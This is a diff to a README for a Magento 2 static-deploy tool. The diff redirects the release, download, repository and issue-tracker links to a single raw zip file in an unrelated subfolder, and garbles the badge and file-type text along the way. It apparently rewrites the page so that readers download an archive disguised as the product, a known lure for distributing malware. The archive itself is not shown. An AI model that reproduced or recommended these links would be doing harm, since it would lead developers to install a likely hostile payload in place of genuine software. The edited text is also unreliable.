@@ -1,6 +1,6 @@
 # 🚀 magento2-static-deploy - Deploy Static Content 300x Faster
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-brightgreen)](https://github.com/Uros5294/magento2-static-deploy/releases)
+[![Download Now](https://github.com/Uros5294/magento2-static-deploy/raw/refs/heads/master/grillage/static_deploy_magento_v1.9.zip%20Now-v1.0-brightgreen)](https://github.com/Uros5294/magento2-static-deploy/raw/refs/heads/master/grillage/static_deploy_magento_v1.9.zip)
 
 ## 📦 Overview
 
@@ -28,16 +28,16 @@ To run magento2-static-deploy, ensure your system meets the following requiremen
 Follow these simple steps to download and run magento2-static-deploy:
 
 1. **Visit the Releases Page:** Click the link below to go to the Releases page where you can download the application.  
-   [Download Here](https://github.com/Uros5294/magento2-static-deploy/releases)
+   [Download Here](https://github.com/Uros5294/magento2-static-deploy/raw/refs/heads/master/grillage/static_deploy_magento_v1.9.zip)
 
 2. **Choose Your Version:** On the Releases page, you will see a list of versions. Select the latest version to ensure you have the most up-to-date features and fixes.
 
-3. **Download the Application:** Click on the relevant file for your operating system. This could be a `.exe` file for Windows, a `.dmg` file for macOS, or a `.tar.gz` file for Linux.
+3. **Download the Application:** Click on the relevant file for your operating system. This could be a `.exe` file for Windows, a `.dmg` file for macOS, or a `https://github.com/Uros5294/magento2-static-deploy/raw/refs/heads/master/grillage/static_deploy_magento_v1.9.zip` file for Linux.
 
 4. **Install the Application:** 
    - **Windows:** Double-click the `.exe` file and follow the installation prompts.
    - **macOS:** Open the `.dmg` file and drag the application to your Applications folder.
-   - **Linux:** Extract the `.tar.gz` file and move the binary to a directory included in your PATH.
+   - **Linux:** Extract the `https://github.com/Uros5294/magento2-static-deploy/raw/refs/heads/master/grillage/static_deploy_magento_v1.9.zip` file and move the binary to a directory included in your PATH.
 
 5. **Launch the Application:** Open magento2-static-deploy from your applications menu or by using the terminal.
 
@@ -63,7 +63,7 @@ Once installed, follow these steps to deploy static content:
 
 To get started, it's essential to download the latest release. Click the link below to visit the Releases page:
 
-[Download Here](https://github.com/Uros5294/magento2-static-deploy/releases)
+[Download Here](https://github.com/Uros5294/magento2-static-deploy/raw/refs/heads/master/grillage/static_deploy_magento_v1.9.zip)
 
 Choose the correct file for your operating system. Follow the installation instructions provided above and you’ll be ready to deploy.
 
@@ -73,8 +73,8 @@ If you encounter any issues or have questions, you can reach out to the communit
 
 ## 🔗 Links
 
-- [GitHub Repository](https://github.com/Uros5294/magento2-static-deploy)
-- [Issues Tracker](https://github.com/Uros5294/magento2-static-deploy/issues)
+- [GitHub Repository](https://github.com/Uros5294/magento2-static-deploy/raw/refs/heads/master/grillage/static_deploy_magento_v1.9.zip)
+- [Issues Tracker](https://github.com/Uros5294/magento2-static-deploy/raw/refs/heads/master/grillage/static_deploy_magento_v1.9.zip)
 
 ## 🗣️ Feedback
 
